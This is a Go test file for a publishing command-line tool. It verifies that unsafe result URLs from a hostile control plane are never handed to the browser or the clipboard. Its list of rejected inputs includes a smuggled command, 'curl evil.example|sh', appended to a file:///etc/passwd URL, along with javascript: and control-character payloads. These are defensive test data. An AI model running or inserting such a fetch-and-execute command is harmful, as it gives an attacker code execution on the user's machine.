// SPDX-FileCopyrightText: 2026 Dais & Apex
// SPDX-License-Identifier: AGPL-3.0-only

package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// stubOpeners points the clipboard and browser candidates at a script that
// records each call in a file, and returns that file's path.
func stubOpeners(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	calls := filepath.Join(dir, "calls")
	stub := filepath.Join(dir, "stub")
	script := "#!/bin/sh\necho \"$(basename \"$0\") $*\" >> '" + calls + "'\ncat >/dev/null\n"
	for _, name := range []string{"stub-clip", "stub-open"} {
		if err := os.WriteFile(stub+"-"+name, []byte(script), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	origClip, origOpen := clipboardCandidates, browserCandidates
	clipboardCandidates = [][]string{{stub + "-stub-clip"}}
	browserCandidates = []string{stub + "-stub-open"}
	t.Cleanup(func() { clipboardCandidates, browserCandidates = origClip, origOpen })
	return calls
}

// fakeControlPlane answers every publish with 201 and the given url.
func fakeControlPlane(t *testing.T, resultURL string) string {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusCreated)
		_ = json.NewEncoder(w).Encode(map[string]string{"url": resultURL, "slug": "s"})
	}))
	t.Cleanup(srv.Close)
	return srv.URL
}

// TestPublishRefusesUnsafeResultURL: a hostile or intercepted control plane
// must not get its url handed to xdg-open or the clipboard. Both the one-shot
// and the --watch path are checked; neither stub may run, the error quotes the
// raw value, and runPublish fails.
func TestPublishRefusesUnsafeResultURL(t *testing.T) {
	src := filepath.Join(t.TempDir(), "page.html")
	if err := os.WriteFile(src, []byte("<h1>hi</h1>"), 0o644); err != nil {
		t.Fatal(err)
	}
	bad := []string{
		"file:///etc/passwd\ncurl evil.example|sh", // the audit's value
		"file:///etc/passwd",
		"javascript:alert(1)",
		"https://content.example/x\nother",
		"https://content.example/\x1bx",
		"https://content.example/\x7f",
		"https:///no-host",
		"https://:443/empty-host",
		"https:opaque",
		"ftp://content.example/x",
	}
	for _, u := range bad {
		for _, mode := range [][]string{{"--open"}, {"--watch", "--open"}} {
			calls := stubOpeners(t)
			base := fakeControlPlane(t, u)
			args := append([]string{"--url", base}, mode...)
			var err error
			returned := true
			out := captureStdout(t, func() {
				// On a refused URL --watch must stop, not start watching.
				done := make(chan error, 1)
				go func() { done <- runPublish(append(args, src)) }()
				select {
				case err = <-done:
				case <-time.After(3 * time.Second):
					returned = false
				}
			})
			if !returned {
				t.Errorf("%v %q: runPublish did not return (it went on to watch)", mode, u)
				continue
			}
			if err == nil {
				t.Errorf("%v %q: runPublish = nil, want an error", mode, u)
				continue
			}
			if !strings.Contains(err.Error(), fmt.Sprintf("%q", u)) {
				t.Errorf("%v %q: error does not quote the raw value: %v", mode, u, err)
			}
			if strings.Contains(out, u) {
				t.Errorf("%v %q: raw value printed unquoted to stdout: %q", mode, u, out)
			}
			time.Sleep(50 * time.Millisecond) // openBrowser does not wait
			if b, rerr := os.ReadFile(calls); rerr == nil {
				t.Errorf("%v %q: clipboard or browser was called: %q", mode, u, b)
			}
		}
	}
}

// TestPublishOpensSafeResultURL: a normal https URL is printed, copied and
// opened.
func TestPublishOpensSafeResultURL(t *testing.T) {
	src := filepath.Join(t.TempDir(), "page.html")
	if err := os.WriteFile(src, []byte("<h1>hi</h1>"), 0o644); err != nil {
		t.Fatal(err)
	}
	const good = "https://content.example/s"
	calls := stubOpeners(t)
	base := fakeControlPlane(t, good)
	out := captureStdout(t, func() {
		if err := runPublish([]string{"--url", base, "--open", src}); err != nil {
			t.Errorf("runPublish: %v", err)
		}
	})
	if !strings.Contains(out, good) {
		t.Errorf("stdout = %q, want the URL", out)
	}
	deadline := time.Now().Add(5 * time.Second)
	for {
		b, _ := os.ReadFile(calls)
		if strings.Contains(string(b), "stub-clip") && strings.Contains(string(b), "stub-open "+good) {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("stubs not both called with the URL: %q", b)
		}
		time.Sleep(20 * time.Millisecond)
	}
}
